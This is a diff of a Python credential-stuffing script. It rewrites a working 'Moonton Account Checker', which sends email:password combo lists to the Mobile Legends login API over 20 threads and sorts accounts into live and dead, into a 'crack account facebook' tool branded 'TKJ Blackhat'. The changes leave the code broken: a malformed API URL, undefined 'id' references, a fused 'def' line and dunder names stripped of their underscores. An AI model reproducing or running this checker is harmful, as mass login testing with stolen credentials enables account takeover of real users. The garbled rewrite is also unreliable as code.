@@ -1,13 +1,14 @@
 # coding=utf-8
 
 ###########################################################################
-# Name           : Moonton Account Checker                                #
+# Name           : crack account facebook                                 #
 # File           : cek.py                                                 #
 # Author         : Sam storee                                             #
-# Github         : https://github.com/SammXStoreeku                  #                                     #                                        ##
+# Github         : https://github.com/SammXStoreeku/SammXStoreeku         #                                     #                                        ##
 ###########################################################################
 
 import os, sys, hashlib, json
+from threading import activeCount
 
 try:
   from concurrent.futures import ThreadPoolExecutor
@@ -28,35 +29,40 @@ except ImportError:
     os.system('pip2 install requests')
     exit('Please restart this tools')
 
-api = 'https://accountmtapi.mobilelegends.com/'
+api = 'https:///'accountapi/facebook.com/'
 
-class MOONTON:
-  def __init__(self, url):
+class facebook:
+  def init(self, url):
     self.userdata = []
     self.live = []
     self.die = []
     self.api = url
     print('''\033[0m
-|V| _  _ __ _|_ _ __    /  |_  _  _  |  _  __
-| |(_)(_)| | |_(_)| |   \__| |(/_(_  |<(/_ |
+ ##########################################################################
+# Name           : Moonton Account Checker                                #
+# File           : cek.py                                                 #
+# Author         : Sam storee                                             #
+# Github         : https://github.com/SammXStoreeku/SammStoreeku          #                                     #                                        ##
+###########################################################################
+
 ---------------------------------------------
           - Created By (Samm X Code) -
 ---------------------------------------------
 [#] TKJ Blackhat\n''')
 
   def main(self):
-    print('[!] Pemisah email:password atau email|password\n')
+    print('[!] Pemisah id:password atau id|password\n')
     if sys.version_info.major != 2:
-      empas = input('[?] List empas (ex: list.txt): ')
+      crack = input('[?] List crack (ex: list.txt): ')
     else:
-      empas = raw_input('[?] List empas (ex: list.txt): ')
-    if os.path.exists(empas):
-      for data in open(empas,'r').readlines():
+      crack = raw_input('[?] List crack (ex: list.txt): ')
+    if os.path.exists(crack):
+      for data in open(crack,'r').readlines():
         try:
           user = data.strip().split('|')
-          if user[0] and user[1]:
+          if id[0] and id[1]:
             self.userdata.append({
-              'email': user[0],
+              'id': user[0],
               'pw': user[1],
               'userdata': data.strip()
             })
@@ -65,13 +71,13 @@ class MOONTON:
             user = data.strip().split(':')
             if user[0] and user[1]:
               self.userdata.append({
-                'email': user[0],
+                'id': user[0],
                 'pw': user[1],
                 'userdata': data.strip()
              })
           except: pass
       if len(self.userdata) == 0:
-        exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
+        exit('[!] crack tidak ada atau tidak valid pastikan berformat id:pass atau id|pass')
       print('[*] Total {0} account\n'.format(str(len(self.userdata))))
       with ThreadPoolExecutor(max_workers=20) as thread:
         [thread.submit(self.validate, user) for user in self.userdata]
@@ -79,7 +85,7 @@ class MOONTON:
       print('[#] DIEE: '+str(len(self.die))+' - saved: die.txt')
       exit(0)
     else:
-      print('[!] File tidak ditemukan "{0}"'.format(empas))
+      print('[!] File tidak ditemukan "{0}"'.format(crack))
 
   def hash_md5(self, string):
     md5 = hashlib.new('md5')
@@ -93,13 +99,11 @@ class MOONTON:
       'op': 'login',
       'sign': hashed,
       'params': {
-        'account': user['email'],
+        'account': id['pass'],
         'md5pwd': md5pwd,
       },
       'lang': 'cn'
-    })
-
-  def validate(self, user):
+    })def validate(self, user):
     try:
       data = self.build_params(user)
       response = requests.post(self.api, data=data).json()
@@ -114,5 +118,5 @@ class MOONTON:
     except:
       self.validate(user)
 
-if __name__ == '__main__':
-  (MOONTON(api).main())
+if name == 'main':
+  (facebook(api).main())
